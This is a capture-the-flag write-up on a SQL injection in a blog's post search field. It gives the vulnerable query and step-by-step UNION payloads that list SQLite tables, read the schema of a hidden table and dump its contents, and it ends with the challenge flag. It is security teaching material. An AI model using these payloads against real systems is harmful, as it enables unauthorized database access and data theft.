# Challenge `Wow, it can't be more juicy than this!` writeup

- Vulnerability: SQL injection
- Where: In the post search field
- Impact: It allows to fetch content from other tables

## Finding the vulnerability / Steps to reproduce

1. After sending a string which throws an SQL error, the vulnerable query was then displayed: `SELECT id, title, content FROM blog_post WHERE title LIKE '%{%s}%' OR content LIKE '%{%s}%'`, where `{%s}` are input fields.

2. Since the name of the table containing the hidden post is unknown, we must first find it. In a regular situation, a query such as `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` would show us the content. However, in this case, we need to make a union of this query with the initial one, so the final injection payload becomes `' UNION SELECT 1, group_concat(tbl_name), '' FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- `. With this input, a new post shows up containg the secret table name: `secret_blog_post`.

3. Although we could assume that the columns of the table would match those of the `blog_post` table, we could send the payload `' UNION SELECT 1, sql, '' FROM sqlite_master WHERE type != 'meta' AND sql NOT NULL AND name = 'secret_blog_post' -- `, a modification of `SELECT sql FROM sqlite_master WHERE type != 'meta' AND sql NOT NULL AND name = 'secret_blog_post'`, to get their names.

4. Finally, to get the post, we just need to make a union of the initial query with a query selecting all posts in the `secret_blog_post` table: `' UNION SELECT id, title, content FROM secret_blog_post -- `.

5. A new post then shows up, containing the flag: `SSof{Never_understimate_the_power_of_UNION}`